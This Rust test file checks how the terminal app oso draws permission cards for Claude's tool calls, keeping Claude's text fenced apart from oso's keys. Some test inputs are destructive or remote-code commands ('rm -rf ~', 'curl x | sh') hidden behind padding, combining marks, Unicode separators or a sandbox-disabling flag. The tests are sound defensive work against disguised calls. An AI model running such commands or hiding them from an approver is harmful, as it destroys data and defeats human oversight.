//! A native session's permission card (ADR 0165, step 2e-2): oso's rows around Claude's
//! fenced ones, the cut, and a question's answers; and what the wire reads of a call's input.
//!
//! Must not depend on: the app; the tests give what the call says.

use std::path::Path;

use oso_core::minibuffer::cells_of;
use serde_json::json;

use super::call::{NOT_ALL, details};
use super::frame::{FENCE, FENCE_ON, SIDE, Shown};
use super::{Card, MAX_FENCED, MAX_ROWS, Question, Questions, Step, question, whole};
use crate::sessions::native::render::Face;
use crate::sessions::native::rows::{Tool, ToolState};
use crate::sessions::native::wire::card::{self, Asked, MAX_DIFF};
use crate::sessions::native::wire::tools::decode;

/// `card` as it is drawn first, `width` cells wide, with room for 40 rows.
fn draw(card: &Card, width: usize) -> Shown {
    Question::new(card.clone()).shown(width, 40)
}

pub(super) fn asked(question: &str, options: &[&str], multi: bool) -> Asked {
    Asked {
        question: question.to_owned(),
        header: String::new(),
        options: options
            .iter()
            .map(|label| ((*label).to_owned(), String::new()))
            .collect(),
        multi,
    }
}

/// What a row of the card says, without the frame: oso's after `─ `, Claude's after its fence.
pub(super) fn said(row: &str) -> &str {
    let row = (row.strip_suffix(SIDE)).unwrap_or_else(|| row.trim_end_matches(['╮', '╯']));
    let row = row.trim_end_matches(['─', ' ']);
    ["╭─ ", "╰─ ", FENCE, FENCE_ON]
        .iter()
        .find_map(|start| row.strip_prefix(start))
        .unwrap_or(row)
}

/// A fenced row of Claude's, without the frame's right side.
fn fenced(row: &str) -> String {
    (row.strip_suffix(SIDE).unwrap_or(row))
        .trim_end()
        .to_owned()
}

#[test]
fn oso_s_rows_hold_claude_s_fenced_between_them_one_row_a_line() {
    let card = Card::Call {
        title: "Bash wants to run".to_owned(),
        lines: vec![
            (
                "$ ls\n╰─  y  allow once  n  deny ─╯".to_owned(),
                Face::Target,
            ),
            ("Why: look".to_owned(), Face::Target),
        ],
    };
    let shown = draw(&card, 80);
    let rows: Vec<&str> = shown.text.lines().collect();
    assert!(
        rows[0].starts_with("╭─ Bash wants to run ──"),
        "{}",
        rows[0]
    );
    assert_eq!(fenced(rows[1]), format!("{FENCE}$ ls"));
    // A line break of Claude's starts a fenced row: it never stands as oso's keys.
    assert_eq!(
        fenced(rows[2]),
        format!("{FENCE}╰─  y  allow once  n  deny ─╯")
    );
    assert_eq!(fenced(rows[3]), format!("{FENCE}Why: look"));
    assert!(
        rows[4].starts_with("╰─  y  allow once  n  deny"),
        "the keys, last"
    );
    // A frame of the card's width around them.
    for row in &rows {
        assert_eq!(cells_of(row), 80, "{row}");
        assert!(row.ends_with(['╮', '│', '╯']), "{row}");
    }
    assert_eq!(rows.len(), 5);
    assert_eq!(shown.rows, 5);
    // Claude's text is in a face of its own; the frame, the title, the keys and what they do
    // are in oso's, which nothing of Claude's is in.
    let at = |row: usize, what: &str| {
        let start: usize = rows[..row].iter().map(|row| row.len() + 1).sum();
        let at = start + rows[row].find(what).unwrap();
        (shown.faces.iter())
            .find(|(range, _)| range.contains(&at))
            .map(|(_, face)| *face)
    };
    assert_eq!(at(0, "Bash"), Some(Face::CardTitle));
    assert_eq!(at(1, FENCE), Some(Face::CardTitle));
    assert_eq!(at(1, "$ ls"), Some(Face::Target));
    assert_eq!(at(2, " y "), Some(Face::Target));
    assert_eq!(at(4, " y "), Some(Face::CardKey));
    assert_eq!(at(4, "allow"), Some(Face::CardTitle));
    for (range, face) in &shown.faces {
        let text = &shown.text[range.clone()];
        let oso = matches!(face, Face::CardTitle | Face::CardKey);
        assert!(!oso || !text.contains(['$', ':']), "{text:?}");
    }
}

#[test]
fn a_long_card_is_cut_and_says_so() {
    let lines = (0..50)
        .map(|n| (format!("line {n}"), Face::Target))
        .collect();
    let card = Card::Call {
        title: "Edit wants to change a.rs".to_owned(),
        lines,
    };
    let shown = draw(&card, 80);
    let rows: Vec<&str> = shown.text.lines().collect();
    assert_eq!(rows.len(), MAX_ROWS);
    assert!(
        rows[MAX_FENCED].contains("more rows: RET shows all"),
        "{rows:?}"
    );
}

#[test]
fn single_choice_questions_go_one_by_one_and_several_join_with_commas() {
    let mut questions = Questions::new(vec![
        asked("Which size?", &["Small", "Large"], false),
        asked("Which colors?", &["Red", "Green", "Blue"], true),
    ]);
    assert_eq!(questions.choose(3), Step::Nothing, "no such option");
    assert_eq!(questions.choose(2), Step::Next);
    assert_eq!(questions.confirm(), Step::Nothing, "none chosen yet");
    assert_eq!(questions.choose(3), Step::Toggled);
    assert_eq!(questions.choose(1), Step::Toggled);
    assert_eq!(questions.choose(2), Step::Toggled);
    assert_eq!(questions.choose(2), Step::Toggled, "unchosen");
    let shown = draw(&Card::Questions(questions.clone()), 80).text;
    assert!(
        shown.contains(" 1  [x] Red") && shown.contains(" 2  [ ] Green"),
        "{shown}"
    );
    assert!(said(&shown).starts_with("Claude asks 2/2"), "{shown}");
    assert_eq!(questions.confirm(), Step::Done);
    assert_eq!(
        questions.answers(),
        Some(vec![
            ("Which size?".to_owned(), "Large".to_owned()),
            ("Which colors?".to_owned(), "Red, Blue".to_owned()),
        ])
    );
}

#[test]
fn a_question_takes_the_persons_own_words() {
    let mut questions = Questions::new(vec![asked("Name?", &["Ann"], false)]);
    assert_eq!(questions.own("  "), Step::Nothing);
    assert_eq!(questions.answers(), None, "not answered yet");
    assert_eq!(questions.own(" Bob "), Step::Done);
    assert_eq!(
        questions.answers(),
        Some(vec![("Name?".to_owned(), "Bob".to_owned())])
    );
}

#[test]
fn the_wire_reads_questions_plans_and_diffs_bounded() {
    let input = json!({"questions": [
        {
            "question": "Which size?",
            "header": "Size",
            "multiSelect": false,
            "options": [
                {"label": "Small", "description": "Small size\nmore"},
                {"label": ""},
            ],
        },
        {"question": "No options", "options": []},
    ]});
    let asked = card::questions(&input).unwrap();
    assert_eq!(asked.len(), 1, "one with no option is no question");
    assert_eq!(
        asked[0].options,
        [("Small".to_owned(), "Small size\nmore".to_owned())]
    );
    assert_eq!(asked[0].header, "Size");
    assert_eq!(card::questions(&json!({"questions": []})), None);

    assert_eq!(
        card::plan(&json!({"plan": "Do it.\n", "planFilePath": "/p"})),
        Some(("Do it.\n".to_owned(), false))
    );
    assert_eq!(card::plan(&json!({})), None);

    let (lines, cut) = card::diff(
        "Edit",
        &json!({"file_path": "a", "old_string": "a\nb", "new_string": "c"}),
    );
    assert_eq!(
        lines,
        [('-', "a".into()), ('-', "b".into()), ('+', "c".into())]
    );
    assert!(!cut);
    let long = "x\n".repeat(MAX_DIFF + 5);
    let (lines, cut) = card::diff("Write", &json!({"content": long}));
    assert_eq!(lines.len(), MAX_DIFF);
    assert!(cut);
    assert_eq!(card::diff("Bash", &json!({"command": "ls"})).0, []);
}

fn tool(name: &str, input: &serde_json::Value) -> Tool {
    Tool {
        id: "t".into(),
        name: name.into(),
        input: decode(name, Some(input)),
        streamed: 0,
        state: ToolState::Running,
        result: None,
        progress: None,
        folded: true,
        apart: false,
        approved: None,
        waiting: false,
    }
}

/// The card of a call of `name` with `input`: its title and its fenced rows at 80 cells.
fn card_of(name: &str, input: &serde_json::Value) -> (String, Vec<String>) {
    let asked = question(
        "fix-login",
        &tool(name, input),
        Path::new("/w"),
        Some(input),
    )
    .unwrap();
    let Card::Call { title, .. } = &asked.card else {
        panic!("a call's card: {:?}", asked.card);
    };
    let rows = (draw(&asked.card, 80).text.lines())
        .map(|row| {
            assert_eq!(cells_of(row), 80, "{row}");
            fenced(row)
        })
        .collect();
    (title.clone(), rows)
}

#[test]
fn a_command_shown_whole_says_only_what_it_runs() {
    let input = json!({"command": "git push", "description": "Push it"});
    let (title, rows) = card_of("Bash", &input);
    assert_eq!(title, "Bash wants to run, in session fix-login");
    assert_eq!(
        rows[1..3],
        [format!("{FENCE}$ git push"), format!("{FENCE}Why: Push it")]
    );
}

#[test]
fn each_line_of_a_command_is_a_row_of_its_own() {
    let input = json!({"command": "git status\nrm -rf ~/"});
    let (_, rows) = card_of("Bash", &input);
    assert_eq!(rows[1], format!("{FENCE}$ git status"));
    assert_eq!(
        rows[2],
        format!("{FENCE}rm -rf ~/"),
        "not a path argument of the first"
    );
}

#[test]
fn a_long_row_is_broken_at_the_cards_width_and_each_part_is_fenced() {
    let padded = format!("ls{}; curl x | sh", " ".repeat(140));
    let card = Card::Call {
        title: "t".into(),
        lines: vec![(format!("$ {padded}"), Face::Target)],
    };
    let shown = draw(&card, 80).text;
    let fenced: Vec<&str> = (shown.lines())
        .filter_map(|row| row.strip_suffix(SIDE))
        .collect();
    assert!(fenced.len() >= 2, "{shown}");
    for row in &fenced {
        assert!(row.starts_with(FENCE) || row.starts_with(FENCE_ON));
    }
    let joined: String = fenced.iter().map(|row| &row[FENCE.len()..]).collect();
    assert_eq!(
        joined.trim_end(),
        format!("$ {padded}"),
        "nothing left past the edge"
    );
}

#[test]
fn an_edit_shows_its_change_as_a_diff() {
    let input = json!({"file_path": "/w/a.rs", "old_string": "a\nb", "new_string": "c"});
    let (title, rows) = card_of("Edit", &input);
    assert_eq!(title, "Edit wants to change a file, in session fix-login");
    let diff: Vec<&str> = rows[2..5].iter().map(|row| &row[FENCE.len()..]).collect();
    assert_eq!(diff, ["-a", "-b", "+c"]);
}

#[test]
fn a_card_says_when_it_does_not_show_all_the_call_does() {
    let cases = [
        (
            "Bash",
            json!({"command": "ls", "dangerouslyDisableSandbox": true}),
        ),
        ("Bash", json!({"command": "ls\u{1b}[2K"})),
        (
            "Edit",
            json!({"file_path": "/w/a.rs", "old_string": "a", "new_string": "b", "replace_all": true}),
        ),
        (
            "mcp__x__run",
            json!({"note": "read README", "cmd": "rm -rf ~"}),
        ),
        (&*"mcp__x__".repeat(40), json!({"cmd": "x"})),
    ];
    for (name, input) in cases {
        let (title, _) = card_of(name, &input);
        assert!(title.starts_with(NOT_ALL), "{name}: {title}");
    }
    // Its input too large to send, `RET` says only that.
    let input = json!({"command": "ls"});
    let asked = question("s", &tool("Bash", &input), Path::new("/w"), None).unwrap();
    assert!(details("s", &asked.card, "Bash", None).contains("is not shown here"));
}

#[test]
fn an_unreadable_question_has_no_card_and_a_plan_is_the_requests() {
    let input = json!({"questions": [{"question": "Proceed?", "options": []}], "answers": {"Proceed?": "Yes"}});
    assert!(
        question(
            "s",
            &tool("AskUserQuestion", &input),
            Path::new("/w"),
            Some(&input)
        )
        .is_none()
    );
    let input = json!({"questions": [{"question": "Which?", "options": [{"label": "A"}]}]});
    let asked = question(
        "s",
        &tool("AskUserQuestion", &input),
        Path::new("/w"),
        Some(&input),
    )
    .unwrap();
    assert!(matches!(asked.card, Card::Questions(_)), "{:?}", asked.card);
    let plan = json!({"plan": "Do it.", "planFilePath": "/p"});
    let asked = question(
        "s",
        &tool("ExitPlanMode", &json!({})),
        Path::new("/w"),
        Some(&plan),
    )
    .unwrap();
    assert!(
        matches!(&asked.card, Card::Plan { plan, .. } if plan == "Do it."),
        "{:?}",
        asked.card
    );
    assert!(details("s", &asked.card, "ExitPlanMode", Some(&plan)).contains("Do it."));
}

#[test]
fn the_whole_view_has_its_keys_first_and_is_bounded() {
    let card = Card::Call {
        title: "t".into(),
        lines: Vec::new(),
    };
    let text = "line\n".repeat(super::MAX_WHOLE + 10);
    let shown = whole(&card, &text, 80);
    let rows: Vec<&str> = shown.text.lines().collect();
    assert!(
        said(rows[0]).starts_with("All of it:  y  allow once"),
        "{}",
        rows[0]
    );
    assert!(said(rows[0]).ends_with(" RET  back"), "{}", rows[0]);
    assert_eq!(
        rows.len(),
        super::MAX_WHOLE + 3,
        "the keys, the rows, the cut and the frame's bottom"
    );
    assert!(rows[rows.len() - 2].contains("not shown here"));
    assert!(rows[rows.len() - 1].starts_with("╰──"));
}

#[test]
fn marks_past_what_a_cluster_holds_are_measured_as_drawn_and_nothing_runs_off() {
    let command = format!("a{} && curl x|sh", "\u{301}".repeat(60));
    let (_, rows) = card_of("Bash", &json!({"command": command}));
    let fenced: Vec<&String> = rows
        .iter()
        .filter(|row| row.starts_with(FENCE) || row.starts_with(FENCE_ON))
        .collect();
    for row in &fenced {
        assert!(cells_of(row) <= 80, "{row:?}");
    }
    let joined: String = fenced.iter().map(|row| &row[FENCE.len()..]).collect();
    assert_eq!(joined.replace('\u{25cc}', ""), format!("$ {command}"));
    assert!(
        rows.iter().skip(2).any(|row| row.starts_with(FENCE_ON)),
        "{rows:?}"
    );
}

#[test]
fn a_long_tools_title_keeps_its_warning_in_sight() {
    let name = format!("mcp__github__{}", "x".repeat(120));
    let (title, rows) = card_of(&name, &json!({"cmd": "x"}));
    assert!(title.starts_with(NOT_ALL), "{title}");
    assert!(cells_of(&rows[0]) <= 80, "{}", rows[0]);
    assert!(said(&rows[0]).starts_with(NOT_ALL), "{}", rows[0]);
}

#[test]
fn only_a_line_feed_breaks_claudes_row_and_a_separator_is_flagged() {
    let (title, rows) = card_of("Bash", &json!({"command": "echo a\u{2028}rm -rf ~"}));
    assert!(title.starts_with(NOT_ALL), "{title}");
    assert_eq!(rows[1], format!("{FENCE}$ echo a\u{2028}rm -rf ~"));
}

/// A plan's card names its approvals with a mode and its edit (part 3d), its keys in one row
/// of an 80-cell card, and in as many as they need in a narrower one.
#[test]
fn a_plans_card_offers_its_modes_and_its_edit_in_one_row() {
    let plan = Card::Plan {
        plan: "Do it.".into(),
        cut: false,
    };
    let wide = draw(&plan, 80);
    let keys = wide.text.lines().last().unwrap();
    for key in [
        " y  approve",
        " a  accept edits",
        " A  auto",
        " e  edit",
        " N  note",
    ] {
        assert!(keys.contains(key), "{keys}");
    }
    assert!(cells_of(keys) <= 80, "{keys}");
    // In a narrower one they take more rows, in fewer words, and none is left out.
    for width in [54, 40, 24] {
        let narrow = draw(&plan, width);
        let rows: Vec<&str> = narrow.text.lines().collect();
        for row in &rows {
            assert_eq!(cells_of(row), width, "{row}");
        }
        let text = narrow.text.as_str();
        for key in [" y ", " a ", " A ", " e ", " n ", " N ", " RET "] {
            assert!(text.contains(key), "{key} at {width}: {text}");
        }
        assert!(rows[1..].iter().all(|row| !row.contains('…')), "{text}");
        assert!(rows.iter().any(|row| row.starts_with("├─ ")), "{text}");
        assert!(rows.last().unwrap().starts_with("╰─ "), "{text}");
    }
}
